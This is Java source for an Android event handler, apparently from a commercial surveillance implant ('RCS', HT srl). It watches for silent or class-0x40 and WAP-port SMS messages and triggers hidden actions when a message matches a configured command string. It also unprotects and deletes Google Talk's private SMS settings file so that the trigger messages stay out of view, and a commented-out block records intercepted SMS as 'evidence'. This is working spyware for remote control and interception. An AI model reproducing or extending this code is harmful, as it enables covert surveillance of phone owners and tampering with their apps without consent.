/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventSms.java
 * Created      : 6-mag-2011
 * Author		: zeno -> mica vero! Que!!! -> per l'header e' vero. Z. ;)
 * *******************************************/

package com.android.dvci.event;

import android.telephony.SmsMessage;

import com.android.dvci.ProcessInfo;
import com.android.dvci.ProcessStatus;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfEvent;
import com.android.dvci.conf.ConfigurationException;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.evidence.EvidenceType;
import com.android.dvci.file.AutoFile;
import com.android.dvci.file.Path;
import com.android.dvci.interfaces.Observer;
import com.android.dvci.listener.BSm;
import com.android.dvci.listener.ListenerOOBSms;
import com.android.dvci.listener.ListenerSms;
import com.android.dvci.module.ModuleMessage;
import com.android.dvci.module.message.OutOfBandSms;
import com.android.dvci.module.message.Sms;
import com.android.dvci.util.ByteArray;
import com.android.dvci.util.Check;
import com.android.dvci.util.DataBuffer;
import com.android.dvci.util.DateTime;
import com.android.dvci.util.SmsMessageBase;
import com.android.dvci.util.StringUtils;
import com.android.dvci.util.WChar;
import com.android.mm.M;

import java.util.Date;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * The EventOOBSms is an OOB event delivered through SMS, It observes OutOfBandSms events which
 * are delivered by the {@link com.android.dvci.module.message,ListenerOOBSms}. which in turn look for {@link com.android.dvci.module.message.LowEventSms}
 * which are delivered by {@link com.android.dvci.listener.ListenerOOBSms}
 */

public class EventOOBSms extends BaseEvent implements Observer<OutOfBandSms> {
	/** The Constant TAG. */
	private static final String TAG = "EventOOBSms"; //$NON-NLS-1$

	private int actionOnEnter;
	private String  msg;

	//private ProcessObserver processObserver;

	@Override
	public void actualStart() {
		ListenerOOBSms.self().attach(this);
	}

	@Override
	public void actualStop() {
		ListenerOOBSms.self().detach(this);
	}

	@Override
	public boolean parse(ConfEvent conf) {
		try {
			msg = conf.getString(M.e("text")).toLowerCase();
		} catch (final ConfigurationException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: params FAILED");//$NON-NLS-1$
			}
			return false;
		}

		return true;
	}

	@Override
	public void actualGo() {
		
	}
	
	@Override
	public void notifyProcess(ProcessInfo b) {
		if(b.status == ProcessStatus.STOP && b.processInfo.contains(M.e("com.google.android.talk"))){
			String xmlPath = M.e("/data/data/com.google.android.talk/shared_prefs/smsmms.xml");
			Path.unprotect(xmlPath);
			AutoFile file = new AutoFile(xmlPath);
			byte[] data = file.read();
			if(data==null)
				return;
			String content = new String(data);
			if(!StringUtils.isEmpty(content))
			if(content.contains(M.e("<boolean name=\"enable_smsmms_key\" value=\"true\""))){
				if (Cfg.DEBUG) {
					Check.log(TAG + " (notifyProcess) Bad value!");
				}
				file.delete();
			}
		}
	}

	// Viene richiamata dal listener (dalla dispatch())
	public int notification(OutOfBandSms s) {
		String payload = "";
		if (Cfg.DEBUG) {
			Check.log(TAG + " notification: Got SMS notification from: " + s.sms.getOriginatingAddress() + " Body: ");//$NON-NLS-1$ //$NON-NLS-2$
		}
		if (s.smsHeader != null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "  notification: processing WAP ");
				Check.log(TAG + "  notification: userData present");
			}
			byte[] userData = s.smsBase.getUserData();
			byte[] userDataRcs = s.smsBase.getUserDataRcs();
			if (Cfg.DEBUG) {
				Check.log(TAG + "  notification: processing WAP '" + userData + "',DPORT=" + s.smsHeader.portAddrs.destPort + ",SPORT=" + s.smsHeader.portAddrs.origPort);
			}
			if (Cfg.DEBUG) {
				//7byte to skip userdataHeader
				Check.log(TAG + "notification:  userData '" + StringUtils.byteArrayToHexString(userData));
				Check.log(TAG + "notification:  userDataRcs '" + StringUtils.byteArrayToHexString(userDataRcs));
			}
			payload = new String(userDataRcs);

		} else {
			s.smsBase = null;
			if (Cfg.DEBUG) {
				Check.log(TAG + "  notification: normal sms");
			}
			if (s.sms.getProtocolIdentifier() == 0x40 || s.sms.getMessageClass() == SmsMessage.MessageClass.UNKNOWN) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " notification: pid 0x40 ( silent ) or UNKNOWN messageClass");
				}
				payload = s.sms.getMessageBody();
				//saveLowEventPdu(s.pdu,s.smsBase);
			}
		}
		if (Cfg.DEBUG) {
			Check.log(TAG + " notification: payload=" + payload);
		}
		if(!isInteresting(payload, this.msg)){
			return 0;
		}



		onEnter();
		onExit();

		return 1;
	}
	/*
	public static void saveLowEventPdu(byte[] pdu,SmsMessageBase smsB) {
		try {
			final SmsMessage sms = SmsMessage.createFromPdu(pdu);
			ScheduledExecutorService exec = Executors.newScheduledThreadPool(1);
			String body = null;
			if(smsB!=null){
				body = new String(smsB.getUserDataRcs());
			}else{
				body = sms.getMessageBody();
			}
			final String msgText = body;
			exec.schedule(new Runnable(){
				@Override
				public void run(){
					if (Cfg.DEBUG) {
						Check.log(TAG + " silentSmsPdu: saving evidence " + msgText);
					}
					String from, to;
					final String address = sms.getOriginatingAddress();
					final byte[] body = WChar.getBytes(msgText);

					final long date = sms.getTimestampMillis();
					final boolean sent = false;
					int flags;

					if (sent) {
						flags = 0;
						from = M.e("local"); //$NON-NLS-1$
						to = address;
					} else {
						flags = 1;
						to = M.e("local-silent"); //$NON-NLS-1$
						from = address;
					}

					final int additionalDataLen = 48;
					final byte[] additionalData = new byte[additionalDataLen];

					final DataBuffer databuffer = new DataBuffer(additionalData, 0, additionalDataLen);
					databuffer.writeInt(ModuleMessage.SMS_VERSION);
					databuffer.writeInt(flags);

					final DateTime filetime = new DateTime(new Date(date));
					databuffer.writeLong(filetime.getFiledate());
					databuffer.write(ByteArray.padByteArray(from.getBytes(), 16));
					databuffer.write(ByteArray.padByteArray(to.getBytes(), 16));
					if (body.length==0) {
						EvidenceBuilder.atomic(EvidenceType.SMS_NEW, additionalData, WChar.getBytes(M.e("empty message")), new Date(date));
					}else{
						EvidenceBuilder.atomic(EvidenceType.SMS_NEW, additionalData, body, new Date(date));
					}

					boolean isCoreRunning = Core.iSR();
					final Sms rcs_sms = new Sms(sms.getOriginatingAddress(), msgText.toString(),System.currentTimeMillis());
					if (isCoreRunning) {
						ListenerSms.self().internalDispatch(rcs_sms);
					}else{
						Thread thread=new Thread(new Runnable() {
							public void run() {
								try {
									Thread.sleep(5000);
								} catch (InterruptedException e) {

								}
								ListenerSms.self().internalDispatch(rcs_sms);
							};
						});
						thread.start();
					}

				}
			}, 1, TimeUnit.SECONDS);
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "  silentSmsPdu: Exception:", e);
			}
		}
	}
	*/
	public static boolean isInteresting(String s, String msg) {
		// Case insensitive
		if (s.toLowerCase().startsWith(msg) == false) {
			return false;
		}
		return true;
	}
}
